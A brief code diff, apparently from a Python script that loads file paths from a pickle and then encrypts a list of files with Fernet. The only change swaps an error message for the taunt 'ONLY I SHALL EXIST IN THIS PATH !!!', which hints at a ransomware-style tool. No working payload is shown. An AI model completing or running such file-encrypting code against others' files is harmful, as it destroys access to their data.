@@ -61,7 +61,7 @@ def readFilePaths(directory_for_pickle):
             file.close()
             return readFiles
     except:
-        print("HELP!!")
+        print("ONLY I SHALL EXIST IN THIS PATH !!!")
 
 def encrypt(listOfFiles, key):
     f = Fernet(key)
